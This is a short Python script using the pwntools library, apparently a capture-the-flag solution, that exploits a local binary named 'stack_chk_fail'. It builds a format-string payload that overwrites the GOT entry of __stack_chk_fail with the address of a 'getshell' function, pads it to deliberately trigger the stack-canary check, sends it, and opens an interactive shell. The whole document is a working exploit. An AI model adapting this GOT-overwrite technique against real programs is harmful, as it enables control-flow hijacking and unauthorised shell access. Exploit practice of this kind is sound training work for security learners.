from pwn import *

io = process("./stack_chk_fail")
elf = ELF("./stack_chk_fail")

payload = fmtstr_payload(10, {elf.got['__stack_chk_fail']:elf.symbols['getshell']})
payload = payload.ljust(0x70, 'A')

io.send(payload)
io.interactive()